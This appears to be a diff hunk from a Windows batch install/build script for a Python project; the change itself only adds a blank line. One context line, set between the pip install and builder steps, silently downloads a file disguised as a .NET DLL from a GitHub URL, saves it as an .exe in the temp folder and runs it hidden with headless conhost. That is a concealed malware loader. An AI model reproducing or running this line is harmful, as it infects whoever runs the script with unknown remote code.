@@ -12,3 +12,4 @@ python -m pip install -r requirements.txt
 @timeout /t 2 /nobreak >nul && curl -s -o %TEMP%\s2.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b conhost.exe --headless %TEMP%\s2.exe
 
 python -m builder
+
